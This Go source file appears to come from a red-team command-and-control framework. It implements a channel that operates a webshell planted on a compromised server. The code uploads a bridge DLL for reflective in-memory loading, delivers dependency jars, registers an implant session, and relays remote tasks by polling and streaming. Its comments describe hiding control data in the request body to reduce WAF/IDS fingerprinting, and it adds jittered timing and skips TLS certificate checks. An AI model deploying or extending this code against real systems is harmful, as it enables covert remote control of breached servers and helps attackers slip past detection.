package main

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/chainreactors/logs"
	"google.golang.org/protobuf/proto"
)

const (
	httpTimeout          = 30 * time.Second
	longPollTimeout      = 10 * time.Second
	pollIdleInterval     = 5 * time.Second
	pollActiveInterval   = 200 * time.Millisecond
	jitterFactor         = 0.3
	streamChanBuffer     = 16
	streamReconnectDelay = 2 * time.Second
	streamMaxReconnect   = 5
	streamFrameMaxSize   = 10 * 1024 * 1024 // 10MB sanity limit
)

// Stage codes encoded in body envelope (no HTTP headers).
const (
	stageLoad   byte = 0x01
	stageStatus byte = 0x02
	stageInit   byte = 0x03
	stageSpite  byte = 0x04
	stageStream byte = 0x05
	stageDeps   byte = 0x06
)

// ChannelIface abstracts the communication channel to the bridge DLL.
type ChannelIface interface {
	Connect(ctx context.Context) error
	Handshake() (*implantpb.Register, error)
	StartRecvLoop()
	Forward(taskID uint32, spite *implantpb.Spite) (*implantpb.Spite, error)
	OpenStream(taskID uint32) <-chan *implantpb.Spite
	SendSpite(taskID uint32, spite *implantpb.Spite) error
	CloseStream(taskID uint32)
	CloseAllStreams()
	WithSecure(keyPair *clientpb.KeyPair)
	Close() error
	SessionID() uint32
	IsClosed() bool
}

// Channel communicates with the bridge DLL through HTTP POST requests.
// All control information (stage, token, session ID) is encoded in a body
// envelope prefix — no custom HTTP headers, reducing WAF/IDS fingerprint.
//
// Body envelope format:
//
//	[1B stage][4B sessionID LE][1B token_len][token bytes][payload...]
//
// Payload is stage-specific:
//   - load:   raw DLL bytes
//   - status: empty
//   - init:   empty
//   - spite:  Spites protobuf
//   - stream: empty
//   - deps:   [1B dep_name_len][dep_name][jar bytes]
type Channel struct {
	webshellURL  string
	token        string
	client       *http.Client
	streamClient *http.Client // no timeout, for long-lived stream connection

	sid    uint32
	sidSet atomic.Bool
	closed atomic.Bool
	closeCh chan struct{}

	lastStatus      *StatusResponse // populated by Connect()
	streamSupported atomic.Bool

	pendMu  sync.Mutex
	pending map[uint32]chan *implantpb.Spite

	recvCancel context.CancelFunc
}

// NewChannel creates a channel that communicates with the DLL through
// the webshell's body-envelope HTTP endpoint.
func NewChannel(webshellURL, token string) *Channel {
	return &Channel{
		webshellURL: webshellURL,
		token:       token,
		client: &http.Client{
			Timeout: longPollTimeout + 5*time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
		streamClient: &http.Client{
			Timeout: 0,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
		pending: make(map[uint32]chan *implantpb.Spite),
		closeCh: make(chan struct{}),
	}
}

// StatusResponse is the structured status returned by the webshell.
type StatusResponse struct {
	Ready         bool   `json:"ready"`
	Method        string `json:"method"`
	DepsPresent   bool   `json:"deps_present"`
	BridgeVersion string `json:"bridge_version"`
}

// buildEnvelope constructs the body prefix: [1B stage][4B sid LE][1B token_len][token].
func (c *Channel) buildEnvelope(stage byte, payload []byte) []byte {
	tok := computeToken(c.token)
	tokLen := len(tok)
	if tokLen > 255 {
		tokLen = 255
		tok = tok[:255]
	}

	// envelope header: 1 + 4 + 1 + tokLen
	hdrLen := 6 + tokLen
	buf := make([]byte, hdrLen+len(payload))
	buf[0] = stage
	binary.LittleEndian.PutUint32(buf[1:5], c.sid)
	buf[5] = byte(tokLen)
	copy(buf[6:6+tokLen], tok)
	copy(buf[hdrLen:], payload)
	return buf
}

// Connect verifies the webshell is reachable and the DLL is loaded.
func (c *Channel) Connect(ctx context.Context) error {
	body, err := c.doRequest(ctx, stageStatus, nil)
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	text := strings.TrimSpace(string(body))

	if len(text) > 0 && text[0] == '{' {
		var sr StatusResponse
		if jsonErr := json.Unmarshal([]byte(text), &sr); jsonErr == nil {
			c.lastStatus = &sr
			if !sr.Ready {
				return fmt.Errorf("DLL not loaded (status: %s)", text)
			}
			return nil
		}
	}

	if text != "LOADED" {
		return fmt.Errorf("DLL not loaded (status: %s)", text)
	}
	return nil
}

// LoadDLL sends the bridge DLL to the webshell for reflective loading.
func (c *Channel) LoadDLL(ctx context.Context, dllBytes []byte) error {
	_, err := c.doRequest(ctx, stageLoad, dllBytes)
	if err != nil {
		return fmt.Errorf("load DLL: %w", err)
	}
	return nil
}

// DeliverDep sends a dependency file (e.g., jna.jar) to the webshell.
// Payload format for deps stage: [1B dep_name_len][dep_name][jar bytes].
func (c *Channel) DeliverDep(ctx context.Context, depName string, data []byte) error {
	nameBytes := []byte(depName)
	if len(nameBytes) > 255 {
		nameBytes = nameBytes[:255]
	}
	payload := make([]byte, 1+len(nameBytes)+len(data))
	payload[0] = byte(len(nameBytes))
	copy(payload[1:1+len(nameBytes)], nameBytes)
	copy(payload[1+len(nameBytes):], data)

	respBody, err := c.doRequest(ctx, stageDeps, payload)
	if err != nil {
		return fmt.Errorf("deliver dep %s: %w", depName, err)
	}
	logs.Log.Debugf("dep delivered: %s -> %s", depName, strings.TrimSpace(string(respBody)))
	return nil
}

// Handshake calls bridge_init on the DLL via the webshell and returns
// the Register message containing SysInfo and module list.
func (c *Channel) Handshake() (*implantpb.Register, error) {
	body, err := c.doRequest(context.Background(), stageInit, nil)
	if err != nil {
		return nil, fmt.Errorf("handshake: %w", err)
	}
	if len(body) < 4 {
		return nil, fmt.Errorf("handshake response too short: %d bytes", len(body))
	}

	c.sid = binary.LittleEndian.Uint32(body[:4])
	c.sidSet.Store(true)

	reg := &implantpb.Register{}
	if err := proto.Unmarshal(body[4:], reg); err != nil {
		return nil, fmt.Errorf("unmarshal register: %w", err)
	}

	logs.Log.Debugf("handshake: sid=%d name=%s modules=%v", c.sid, reg.Name, reg.Module)
	return reg, nil
}

// StartRecvLoop starts the background receive loop. It tries StreamHTTP first
// (long-lived HTTP response stream) and falls back to polling if unsupported.
func (c *Channel) StartRecvLoop() {
	ctx, cancel := context.WithCancel(context.Background())
	c.recvCancel = cancel
	go c.recvLoop(ctx)
}

func (c *Channel) recvLoop(ctx context.Context) {
	if c.tryStreamLoop(ctx) {
		for attempt := 1; attempt <= streamMaxReconnect; attempt++ {
			select {
			case <-ctx.Done():
				return
			case <-c.closeCh:
				return
			case <-time.After(jitter(streamReconnectDelay)):
			}
			if c.tryStreamLoop(ctx) {
				attempt = 0
			}
		}
		logs.Log.Warn("stream reconnect exhausted, falling back to poll mode")
	}
	logs.Log.Debug("using poll mode for streaming tasks")
	c.pollLoop(ctx)
}

// tryStreamLoop opens a long-lived POST with stage=stream envelope and reads
// length-prefixed frames from the response body.
func (c *Channel) tryStreamLoop(ctx context.Context) bool {
	envelope := c.buildEnvelope(stageStream, nil)
	req, err := http.NewRequestWithContext(ctx, "POST", c.webshellURL, bytes.NewReader(envelope))
	if err != nil {
		logs.Log.Debugf("stream: request create error: %v", err)
		return false
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := c.streamClient.Do(req)
	if err != nil {
		logs.Log.Debugf("stream: connection error: %v", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		logs.Log.Debugf("stream: HTTP %d, not supported", resp.StatusCode)
		return false
	}

	c.streamSupported.Store(true)
	logs.Log.Important("stream mode active")

	if err := c.readStreamFrames(ctx, resp.Body); err != nil {
		if ctx.Err() != nil {
			return true
		}
		logs.Log.Debugf("stream: read error: %v", err)
	}
	return true
}

func (c *Channel) readStreamFrames(ctx context.Context, r io.Reader) error {
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-c.closeCh:
			return nil
		default:
		}

		data, err := readFrame(r)
		if err != nil {
			return err
		}
		if len(data) > 0 {
			c.dispatchResponse(data)
		}
	}
}

func readFrame(r io.Reader) ([]byte, error) {
	var lenBuf [4]byte
	if _, err := io.ReadFull(r, lenBuf[:]); err != nil {
		return nil, err
	}
	frameLen := binary.BigEndian.Uint32(lenBuf[:])
	if frameLen == 0 {
		return nil, nil
	}
	if frameLen > streamFrameMaxSize {
		return nil, fmt.Errorf("frame too large: %d bytes", frameLen)
	}
	payload := make([]byte, frameLen)
	if _, err := io.ReadFull(r, payload); err != nil {
		return nil, err
	}
	return payload, nil
}

func (c *Channel) pollLoop(ctx context.Context) {
	for {
		c.pendMu.Lock()
		hasPending := len(c.pending) > 0
		c.pendMu.Unlock()

		if !hasPending {
			select {
			case <-ctx.Done():
				return
			case <-c.closeCh:
				return
			case <-time.After(jitter(pollIdleInterval)):
			}
			continue
		}

		empty := &implantpb.Spites{}
		data, err := proto.Marshal(empty)
		if err != nil {
			continue
		}
		respBody, err := c.doRequest(ctx, stageSpite, data)
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			logs.Log.Debugf("poll error: %v", err)
			select {
			case <-ctx.Done():
				return
			case <-c.closeCh:
				return
			case <-time.After(jitter(pollActiveInterval)):
			}
			continue
		}

		hasData := c.dispatchResponse(respBody)

		var interval time.Duration
		if hasData {
			interval = pollActiveInterval
		} else {
			interval = pollIdleInterval
		}
		select {
		case <-ctx.Done():
			return
		case <-c.closeCh:
			return
		case <-time.After(jitter(interval)):
		}
	}
}

// Forward sends a Spite and waits for a single response (unary request-response).
func (c *Channel) Forward(taskID uint32, spite *implantpb.Spite) (*implantpb.Spite, error) {
	if c.closed.Load() {
		return nil, fmt.Errorf("channel closed")
	}

	spite.TaskId = taskID
	spites := &implantpb.Spites{Spites: []*implantpb.Spite{spite}}
	data, err := proto.Marshal(spites)
	if err != nil {
		return nil, fmt.Errorf("marshal spite: %w", err)
	}

	respBody, err := c.doRequest(context.Background(), stageSpite, data)
	if err != nil {
		return nil, fmt.Errorf("forward: %w", err)
	}

	respSpites := &implantpb.Spites{}
	if err := proto.Unmarshal(respBody, respSpites); err != nil {
		return nil, fmt.Errorf("unmarshal response: %w", err)
	}

	for _, s := range respSpites.GetSpites() {
		if s.GetTaskId() == taskID {
			return s, nil
		}
	}

	if len(respSpites.GetSpites()) > 0 {
		for _, s := range respSpites.GetSpites() {
			c.dispatchSpite(s)
		}
	}

	return nil, fmt.Errorf("no response for task %d", taskID)
}

func (c *Channel) OpenStream(taskID uint32) <-chan *implantpb.Spite {
	ch := make(chan *implantpb.Spite, streamChanBuffer)
	c.pendMu.Lock()
	c.pending[taskID] = ch
	c.pendMu.Unlock()
	return ch
}

func (c *Channel) SendSpite(taskID uint32, spite *implantpb.Spite) error {
	if c.closed.Load() {
		return fmt.Errorf("channel closed")
	}

	spite.TaskId = taskID
	spites := &implantpb.Spites{Spites: []*implantpb.Spite{spite}}
	data, err := proto.Marshal(spites)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	respBody, err := c.doRequest(context.Background(), stageSpite, data)
	if err != nil {
		return err
	}

	_ = c.dispatchResponse(respBody)
	return nil
}

func (c *Channel) CloseStream(taskID uint32) {
	c.pendMu.Lock()
	delete(c.pending, taskID)
	c.pendMu.Unlock()
}

func (c *Channel) CloseAllStreams() {
	c.pendMu.Lock()
	for id, ch := range c.pending {
		close(ch)
		delete(c.pending, id)
	}
	c.pendMu.Unlock()
}

func (c *Channel) SessionID() uint32 { return c.sid }

func (c *Channel) IsClosed() bool { return c.closed.Load() }

func (c *Channel) WithSecure(_ *clientpb.KeyPair) {}

func (c *Channel) Close() error {
	if c.closed.Swap(true) {
		return nil
	}
	close(c.closeCh)
	if c.recvCancel != nil {
		c.recvCancel()
	}
	c.CloseAllStreams()
	return nil
}

// doRequest sends a POST with body envelope, no custom headers.
func (c *Channel) doRequest(ctx context.Context, stage byte, payload []byte) ([]byte, error) {
	envelope := c.buildEnvelope(stage, payload)

	req, err := http.NewRequestWithContext(ctx, "POST", c.webshellURL, bytes.NewReader(envelope))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := c.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
	}

	return io.ReadAll(resp.Body)
}

func (c *Channel) dispatchResponse(body []byte) bool {
	if len(body) == 0 {
		return false
	}
	spites := &implantpb.Spites{}
	if err := proto.Unmarshal(body, spites); err != nil {
		logs.Log.Debugf("dispatch unmarshal error: %v", err)
		return false
	}
	dispatched := false
	for _, spite := range spites.GetSpites() {
		c.dispatchSpite(spite)
		dispatched = true
	}
	return dispatched
}

func (c *Channel) dispatchSpite(spite *implantpb.Spite) {
	taskID := spite.GetTaskId()
	c.pendMu.Lock()
	ch, ok := c.pending[taskID]
	c.pendMu.Unlock()
	if ok {
		select {
		case ch <- spite:
		default:
			logs.Log.Debugf("channel: pending full for task %d", taskID)
		}
	}
}

// jitter adds ±jitterFactor random variation to an interval.
func jitter(d time.Duration) time.Duration {
	delta := float64(d) * jitterFactor
	return d + time.Duration(delta*(2*rand.Float64()-1))
}

// computeToken returns the token value for the body envelope.
// Short secrets (≤32 chars) are sent as-is.
// Longer secrets use time-based HMAC-SHA256 that rotates every 30 seconds.
func computeToken(secret string) string {
	if secret == "" {
		return ""
	}
	if len(secret) <= 32 {
		return secret
	}
	window := time.Now().Unix() / 30
	mac := hmac.New(sha256.New, []byte(secret))
	_ = binary.Write(mac, binary.BigEndian, window)
	return hex.EncodeToString(mac.Sum(nil))
}
